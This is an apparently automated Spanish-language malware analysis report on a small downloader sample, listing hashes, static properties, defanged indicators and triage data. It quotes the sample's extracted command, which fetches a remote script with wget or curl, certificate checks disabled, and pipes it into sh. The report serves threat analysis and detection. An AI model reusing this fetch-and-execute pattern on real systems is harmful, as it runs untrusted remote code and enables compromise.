# 🧬 Payload Analysis

`429b30d3f28452216957e1dcc4aea3c4a1945f4aa555ea3bf0e912d4d06d389b`

## 📌 Resumen

Texto ASCII de 372 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://217.60.195.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh`
2. `curl -sk hxxps://217.60.195.XXX/sh)`
3. `sh -s apache.selfre` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/429b30d3f28452216957e1dcc4aea3c4a1945f4aa555ea3bf0e912d4d06d389b.md](../../../../../malware-like/oraculo/downloader/429b30d3f28452216957e1dcc4aea3c4a1945f4aa555ea3bf0e912d4d06d389b.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `429b30d3f28452216957e1dcc4aea3c4a1945f4aa555ea3bf0e912d4d06d389b`
- **SHA1:** `16f40f44de62b76dc000e5f5075dad8c4458853e`
- **MD5:** `5b36d0b0cf8ee0600a788f6e7bb60832`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 372 B |
| Entropía | 5.12 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 217.60.195.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 429b30d3f28452216957e1dcc4aea3c4a1945f4aa555ea3bf0e912d4d06d389b | static_analysis |
| ip | 173.249.37.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
